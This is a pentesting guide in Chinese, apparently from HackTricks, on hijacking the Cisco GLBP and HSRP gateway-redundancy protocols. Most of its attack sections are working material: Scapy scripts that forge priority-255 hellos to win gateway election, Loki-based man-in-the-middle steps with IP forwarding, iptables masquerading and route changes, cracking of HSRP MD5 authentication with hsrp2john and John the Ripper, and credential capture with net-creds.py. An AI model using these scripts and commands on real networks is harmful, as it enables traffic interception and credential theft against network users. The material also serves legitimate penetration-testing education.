# GLBP & HSRP 攻击

{{#include ../../banners/hacktricks-training.md}}


## FHRP 劫持概述

### FHRP 概览

FHRP 旨在通过将多台路由器合并为单一虚拟单元来提高网络的鲁棒性，从而增强负载分配和故障容错能力。Cisco Systems 在该套件中引入了重要的协议，例如 GLBP 和 HSRP。

### GLBP 协议详解

Cisco 的 GLBP 在 TCP/IP 堆栈上运行，使用 UDP 端口 3222 进行通信。GLBP 组内的路由器以 3 秒为间隔交换 "hello" 包。如果某台路由器在 10 秒内未发送这些包，则被视为离线。不过，这些计时器并非固定，可以进行修改。

GLBP 在 IPv6 中使用多播地址 **FF02::66**（通过 UDP/3222），虚拟 MAC 格式变为 `0007.b4xx.xxyy`（AVF ID 在最后一个字节）。计时和攻击面与 IPv4 相同，因此在双栈网络中劫持技术仍然适用。

### GLBP 操作与负载分配

GLBP 的特点是在使用单一虚拟 IP 的同时配合多个虚拟 MAC 地址实现跨路由器的负载分配。在 GLBP 组中，每台路由器都参与数据包转发。与 HSRP/VRRP 不同，GLBP 通过多种机制实现真正的负载均衡：

- Host-Dependent Load Balancing：为主机保持一致的 AVF MAC 地址分配，对于稳定的 NAT 配置至关重要。
- Round-Robin Load Balancing：默认方式，在请求主机间轮流分配 AVF MAC 地址。
- Weighted Round-Robin Load Balancing：根据预定义的 "Weight" 指标分配负载。

### GLBP 的关键组件与术语

- AVG (Active Virtual Gateway)：主要路由器，负责向对等路由器分配 MAC 地址。
- AVF (Active Virtual Forwarder)：负责管理网络流量的路由器。
- GLBP Priority：决定 AVG 的指标，默认值为 100，范围在 1 到 255 之间。
- GLBP Weight：反映路由器当前负载，可手动调整或通过 Object Tracking 动态调整。
- GLBP Virtual IP Address：作为所有连接设备的网络默认网关。

在交互中，GLBP 使用保留多播地址 224.0.0.102 和 UDP 端口 3222。路由器以 3 秒为间隔发送 "hello" 包，如果在 10 秒内错过包则被视为不可用。

### GLBP 攻击机制

攻击者可以通过发送具有最高优先级值（255）的 GLBP 包来成为主路由器。这可能导致 DoS 或 MITM 攻击，允许拦截或重定向流量。

**使用 Scapy 的实际 GLBP 劫持（简短 PoC）**
```python
from scapy.all import *

vip = "10.10.100.254"          # learned from sniffing
pkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw(
b"\x01\x00\xff\x64"      # Version=1, Opcode=Hello, Priority=255, Weight=100
)
send(pkt, iface="eth0", loop=1, inter=1)
```
构造有效负载字节以模拟 GLBP 头 (version/opcode/priority/weight/VRID)。循环发送该帧可确保在没有身份验证时赢得 AVG 选举。

### 使用 Loki 执行 GLBP 攻击

[Loki](https://github.com/raizo62/loki_on_kali) 可以通过注入 priority 和 weight 设置为 255 的数据包来执行 GLBP 攻击。攻击前的步骤包括使用像 Wireshark 这样的工具收集诸如虚拟 IP 地址、是否存在身份验证以及路由器优先级值等信息。

Attack Steps:

1. 将网卡切换到 promiscuous 模式并启用 IP forwarding。
2. 识别目标路由器并获取其 IP。
3. 生成 Gratuitous ARP。
4. 注入恶意 GLBP 数据包，冒充 AVG。
5. 为攻击者的网络接口分配一个次要 IP 地址，镜像 GLBP 虚拟 IP。
6. 实施 SNAT 以实现对全部流量的可见性。
7. 调整路由以确保通过原始 AVG 路由器继续访问互联网。

通过遵循这些步骤，攻击者将自己置于“中间人”位置，能够拦截和分析网络流量，包括未加密或敏感数据。

为演示，以下是所需的命令片段：
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Monitoring and intercepting traffic can be done using net-creds.py or similar tools to capture and analyze data flowing through the compromised network.

### 被动解释 HSRP 劫持（含命令细节）

#### HSRP 概述（热备路由器/冗余协议）

HSRP 是 Cisco 的专有协议，旨在提供网络网关的冗余。它允许将多个物理路由器配置为一个具有共享 IP 地址的单一逻辑单元。该逻辑单元由一个主路由器管理，负责引导流量。与使用优先级和权重等度量来进行负载均衡的 GLBP 不同，HSRP 依赖单个 active 路由器来管理流量。

HSRPv1 使用组播 **224.0.0.2** 和虚拟 MAC `0000.0c07.acXX`；HSRPv2 及用于 IPv6 的 HSRPv2 使用 **224.0.0.102 / FF02::66** 和虚拟 MAC `0000.0c9f.fXXX`。UDP 目标端口为 IPv4 的 **1985**，IPv6 的 **2029**。

#### HSRP 的角色与术语

- **HSRP Active Router**：充当网关的设备，负责管理流量流向。
- **HSRP Standby Router**：备用路由器，在 active 路由器故障时准备接管。
- **HSRP Group**：一组路由器协作形成的单一弹性虚拟路由器。
- **HSRP MAC Address**：分配给 HSRP 逻辑路由器的虚拟 MAC 地址。
- **HSRP Virtual IP Address**：HSRP 组的虚拟 IP 地址，作为连接设备的默认网关。

#### HSRP 版本

HSRP 有两个版本，HSRPv1 和 HSRPv2，主要在组容量、组播 IP 使用和虚拟 MAC 地址结构上有所不同。该协议使用特定的组播 IP 地址来交换服务信息，Hello 包每 3 秒发送一次。如果在 10 秒内未收到包，则认为路由器已不活动。

#### HSRP 攻击机制

HSRP 攻击通过注入最大优先级值强行接管 Active Router 的角色。这可能导致 Man-In-The-Middle (MITM) 攻击。关键的攻击前步骤包括收集有关 HSRP 设置的信息，这可以使用 Wireshark 对流量进行分析来完成。

**使用 Scapy 快速接管 HSRP**
```python
from scapy.all import *

vip = "10.10.100.1"
pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw(
b"\x00\x02\xff\x03\x00\x00\x00\x01"  # Hello, priority 255, group 1
)
send(pkt, iface="eth0", inter=1, loop=1)
```
如果未配置认证，通过持续发送优先级更高的 hellos 可以强制对端进入 *Speak*/*Listen* 状态，并让你成为 *Active*，将流量重定向到你的主机。

**HSRP 认证 特殊情况**

- 旧版明文 auth 可以被轻易伪造。
- MD5 authentication 只覆盖 HSRP 负载；精心构造的数据包仍然可以对控制平面实施速率限制/DoS。NX-OS 版本此前允许对已认证组发起 DoS（参见 Cisco advisory CSCup11309）。
- 在许多 ISP / VPS 共享 VLAN 上，HSRPv1 的组播对租户可见；未启用 auth 时你可以加入并抢占流量。

#### 绕过 HSRP 认证 的步骤

1. 将包含 HSRP 数据的网络流量保存为 .pcap 文件。
```shell
tcpdump -w hsrp_traffic.pcap
```
2. 使用 hsrp2john.py 从 .pcap 文件中提取 MD5 哈希。
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. 使用 John the Ripper 破解这些 MD5 哈希。
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**使用 Loki 执行 HSRP 注入**

1. 启动 Loki 来识别 HSRP 广告。
2. 将网络接口设为混杂模式并启用 IP 转发。
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. 使用 Loki 针对特定路由器，输入已破解的 HSRP 密码，并进行必要配置以冒充 Active Router。
4. 在获得 Active Router 角色后，配置你的网络接口和 IP tables 以拦截合法流量。
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. 修改路由表，通过原 Active Router 路由流量。
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. 使用 net-creds.py 或类似工具从拦截的流量中捕获凭证。
```shell
sudo python2 net-creds.py -i eth0
```

执行这些步骤会使攻击者处于拦截并篡改流量的位置，类似于 GLBP 劫持的流程。这凸显了像 HSRP 这样的冗余协议的脆弱性，以及需要强健的安全措施。

## 参考资料

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Cisco NX-OS HSRP authentication DoS (CSCup11309)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20140611-CVE-2014-3295)
- [Reddit: HSRP seen on VPS shared VLANs](https://www.reddit.com/r/networking/comments/1h0v1aq/hsrp_seen_on_cloud_vlans_without_auth/)
{{#include ../../banners/hacktricks-training.md}}
